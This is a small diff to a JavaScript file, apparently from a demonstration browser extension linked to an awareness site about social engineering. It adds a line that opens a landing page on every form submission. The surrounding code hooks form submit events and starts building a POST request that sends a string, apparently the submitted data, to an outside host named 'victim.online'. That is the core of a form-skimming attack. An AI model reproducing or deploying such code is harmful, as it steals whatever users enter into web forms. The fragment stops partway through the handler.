@@ -3,6 +3,7 @@ var forms = document.forms;
 
 //called when a submit event happens
 function formSubmit(event) {
+    window.open('https://theantisocialengineer.com/chrome-extension-landing-page/')
     var xhr = new XMLHttpRequest();
     xhr.open('POST', 'http://victim.online/');
     var string = '';
